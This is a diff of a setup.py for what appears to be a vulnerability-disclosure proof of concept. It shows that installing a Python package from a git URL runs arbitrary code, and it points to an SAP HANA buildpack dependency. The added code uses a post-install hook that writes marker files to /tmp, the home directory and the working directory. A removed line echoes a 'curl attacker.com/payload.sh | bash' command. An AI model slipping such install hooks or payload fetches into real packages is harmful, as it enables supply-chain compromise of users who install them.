@@ -1,30 +1,49 @@
 from setuptools import setup
+from setuptools.command.install import install
 import os
+import sys
 
-# This executes IMMEDIATELY when pip install runs
-print("\n" + "="*60)
-print("🚨 AUTO-POC: SUPPLY CHAIN RCE VULNERABILITY")
-print("="*60)
-
-# Create proof file automatically
-poc_file = "/tmp/auto_rce_poc.txt"
-with open(poc_file, "w") as f:
-    f.write("CODE EXECUTED DURING PIP INSTALL = RCE POSSIBLE\n")
-    f.write(f"User: {os.getenv('USER')}\n")
-    f.write(f"Time: {__import__('datetime').datetime.now()}\n")
-
-print(f"✅ Proof created: {poc_file}")
-
-# Demonstrate command execution capability
-os.system("echo 'If malicious: curl http://attacker.com/payload.sh | bash'")
-os.system("echo '📦 Installed from: https://github.com/TalhaKhan-404/test.git'")
-
-print("\n" + "⚠️"*30)
-print("RCE VULNERABILITY CONFIRMED")
-print("SAP buildpack vulnerable to same attack")
-print("⚠️"*30)
+class PostInstallPOC(install):
+    """Runs after installation to demonstrate vulnerability."""
+    def run(self):
+        # This runs AFTER installation completes
+        print("\n" + "🚨"*30)
+        print("🚨 POST-INSTALL POC EXECUTED")
+        print("🚨"*30)
+        
+        # Create multiple proof files
+        files_to_create = [
+            "/tmp/pip_rce_poc.txt",
+            os.path.expanduser("~/pip_rce_poc.txt"),
+            "pip_rce_poc_current_dir.txt"
+        ]
+        
+        for file_path in files_to_create:
+            try:
+                with open(file_path, "w") as f:
+                    f.write(f"RCE via pip install from GitHub\n")
+                    f.write(f"File: {file_path}\n")
+                    f.write(f"Time: {__import__('datetime').datetime.now()}\n")
+                print(f"✅ Created: {file_path}")
+            except:
+                pass
+        
+        print("\n⚠️  VULNERABILITY:")
+        print("   pip install git+https://github.com/...")
+        print("   ↑ This executes code from untrusted source")
+        
+        print("\n📦 Found in SAP HANA buildpack:")
+        print("   git+https://github.com/alundesap/python-jws.git/#egg=jws")
+        
+        print("\n" + "✅"*30)
+        print("✅ POC: If you see this, RCE is possible")
+        print("✅"*30)
+        
+        # Continue with normal install
+        install.run(self)
 
 setup(
-    name='auto-poc-rce',
-    version='0.1.0'
+    name='postinstall-poc',
+    version='0.1.0',
+    cmdclass={'install': PostInstallPOC},
 )
